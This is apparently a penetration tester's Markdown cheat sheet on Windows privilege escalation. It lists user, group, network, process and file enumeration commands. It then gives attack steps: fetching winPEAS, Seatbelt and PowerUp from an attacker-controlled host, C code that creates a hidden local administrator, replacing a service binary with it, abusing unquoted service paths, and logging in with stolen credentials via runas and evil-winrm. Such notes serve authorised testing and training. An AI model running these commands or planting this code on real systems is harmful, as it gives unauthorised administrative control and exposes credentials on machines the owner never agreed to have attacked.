# Escalation

CLI escalation: [bottom of the page](https://github.com/ThomasBucaioni/pentools/blob/main/microsoft/escalation.md#cli-escalation)

## Info

### Targets

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

### Users

```
whoami
whoami /priv
whoami /groups
net user
get-localuser
```

### Groups

```
net localgroup
Get-LocalGroup
Get-LocalGroupMember somegroup
```

### System

Windows versions: https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions#/media/File:Windows_Version_History.svg
```
ver
systeminfo
```

### Network

```
ipconfig
ipconfig /all
route print
netstat -ano
```

### Programs

Invoke-command: https://devblogs.microsoft.com/scripting/use-powershell-to-find-installed-software/
```
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
Format-Table -AutoSize
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
Registry keys: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.3
```
Get-ChildItem -Path HKLM:\HARDWARE
```

### Processes

source: https://stackoverflow.com/questions/31374644/get-process-location-path-using-powershell
```
Get-Process
Get-Process -name someprocess |  % { $_.Path + " " + $_.Id}
Get-Process | Select-Object Path
Get-Process | Select-Object -ExpandProperty Path
Get-Process | ForEach-Object {$_.Path}
(Get-Process -Name someprocess).path
(Get-Process -Id someid).path
```

## Other searches

### Files

Find:
```
Get-ChildItem -Path C:\ -Include *.extension -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\*.txt -Recurse -Force
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue | select-object name
```
Display:
```
type somefile.txt
cat somefile.txt
Get-Content somefile.txt
```


### History
```
Get-History
(Get-PSReadlineOption).HistorySavePath
```

### Automatic tools

#### WinPEAS

Upload on the target:
```
kali$ cd /usr/share/peass/winpeas/
kali$ python3 -m http.server 8088
PS> iwr -uri http://AttackerIP/winPEASx64.exe -Outfile winPEAS.exe
```

#### Other tools

URLs:
- https://github.com/carlospolop/PEASS-ng
- https://github.com/GhostPack/Seatbelt
- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
- https://github.com/Marshall-Hallenbeck/compiled_binaries
- https://github.com/411Hall/JAWS

##### Example: Seatbelt

Compiled version: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe

Usage:
```
PS> iwr http://IpAttacker/Seatbelt.exe -OutFile Seatbelt.exe
PS> .\Seatbelt.exe -group=all
```

## Services

List services (warning, needs an RDP connection for non-admin users. A bind shell or WinRM connection won't do):
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode, State, PathName | Where-Object {$_.State -like 'Running'}
```
Check the rights to overwrite user installed binaries:
```
PS> Get_ACL "c:\path\to\user\installed\binary\service.exe"
cmd> icacls "c:\path\to\user\installed\binary\service.exe"
```
Permission mask: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

### Hijacking

#### Manual hijacking: `useradd.c` code

To compile with [cross-compilation](https://github.com/ThomasBucaioni/pentools/blob/main/microsoft/cross-compiling.md): `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user someuser somepass /add");
  i = system ("net localgroup administrators someuser /add");
  
  return 0;
}
```
Upload on the target:
```
iwr -uri http://$IpAttacker/adduser.exe -outfile adduser.exe
```
Overwrite a service binary:
```
move c:\path\to\binary\someservice.exe adduser.exe
```
and restart the computer (with Privilege __SeShutdownPrivilege__, check with `whoami /priv`):
```
shutdown /r /t 0
```
or restart the service if possible (usually takes admin rights...):
```
net stop someservice.exe
```

Compilation on Kali (see cross-compiling.md):
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

#### Auto

```
cd /usr/share/windows-resources/powersploit/Privesc/
python3 -m http.server 80

iwr -uri http://AttackerIP/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

### Unquoted service path

```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
icacls c:\all\the\paths
Get-UnquotedService
Write-ServiceBinary -name 'vulnerablepathservice' -path "C:\unquoted path\"
```

## Other components

### Scheduled tasks

```
schtasks /query /fo LIST /v
```

### Exploits

- https://github.com/itm4n/PrintSpoofer
- https://jlajara.gitlab.io/Potatoes_Windows_Privesc

---

## Cli escalation

### Runas (cmd)

With a password found in `somefile.txt`, we can use `Runas` if in a GUI (triggers a prompt):
```
PS> runas /user:somehackeduser cmd
```
or in current directory:
```
cmd> powershell.exe -Command "Start-Process cmd \"/k cd /d %cd%\" -Verb RunAs"
```

### Powershell

Other user authentication, password entered manually: https://stackoverflow.com/questions/28989750/running-powershell-as-another-user-and-launching-a-script
```
Start-Process powershell.exe -Credential “domain\username” -NoNewWindow -ArgumentList “Start-Process powershell.exe -Verb runAs”
```
or password provided as a Credential object:
```
$username = 'user'
$password = 'password'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process Notepad.exe -Credential $credential
```

### Evil-WinRM

With `evil-winrm` from Kali:
```
kali$ evil-winrm -i $TargetIP -u hackeduser -p "somehackedpass"
```

